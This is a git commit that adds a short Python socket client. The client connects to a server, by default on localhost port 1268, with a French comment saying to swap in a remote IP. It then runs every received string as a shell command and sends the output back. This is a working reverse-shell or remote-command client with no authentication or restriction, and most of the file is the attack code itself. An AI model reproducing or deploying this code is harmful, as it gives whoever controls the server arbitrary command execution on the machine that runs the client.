8da8ae5363de5fa5a32a66c41a7d106866b8eedb
alkan <alkanminecraft@hotmail.com>
2021-04-12 15:50:07 +0200

    0.0

---
+++ git/socket/socket_client.py
@@ -0,0 +1,26 @@
+import socket
+import os
+import sys
+import subprocess
+
+ip = socket.gethostname()
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.connect((socket._LOCALHOST, 1268)) # non-local => changer socket._LOCALHOST en votre ip
+
+print("connected")
+
+while True:
+    data = server.recv(1024).decode("utf-8")
+
+    if len(data) > 0:
+        try:
+            proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+            out, err = proc.communicate()
+            print("client : ",out)
+            server.send(out)
+        except Exception as e:
+            print("error", e)
+
+
+
+
